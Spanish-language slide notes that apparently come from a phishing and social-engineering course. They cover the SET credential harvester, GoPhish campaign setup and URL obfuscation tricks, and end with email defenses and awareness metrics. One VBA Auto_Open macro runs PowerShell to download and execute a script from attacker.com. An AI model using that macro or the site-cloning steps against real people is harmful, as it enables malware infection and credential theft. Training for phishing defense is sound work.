# Social Engineering Toolkit (SET)

## SET - Spear Phishing y Website Attacks

### **Credential Harvester**

```bash
sudo setoolkit
# 1 > 2 > 3 (Site Cloner)
# Clonar sitio y capturar credenciales
```

---

### **Payloads con SET**

```
• FileFormat exploits
• PDF maliciosos
• Office documents con macros
• USB infectious media
```

---

# GoPhish Framework

## Instalación

```bash
wget https://github.com/gophish/gophish/releases/latest
./gophish
# https://localhost:3333
```

---

## Componentes de Campaña

```
1. Sending Profile (SMTP)
2. Email Template
3. Landing Page
4. Users & Groups
5. Campaign (launch)
```

---

# Payloads Maliciosos

## Macros VBA

```vba
Sub Auto_Open()
    ' Descargar y ejecutar payload
    Shell "powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
End Sub
```

---

## Ofuscación URLs

```
• URL shorteners (bit.ly)
• Homograph attacks
• Subdomain tricks
• Open redirects
```

---

# Defensa y Awareness

## Email Security

```
• SPF, DKIM, DMARC
• Anti-phishing filters
• Link protection
• Attachment sandboxing
```

---

## Security Awareness

```
• Training regular
• Simulaciones phishing
• Red flags education
• Reporting protocol
```

---

## KPIs

```
• Click rate <5%
• Data submission <2%
• Report time reduction
• Training completion >90%
```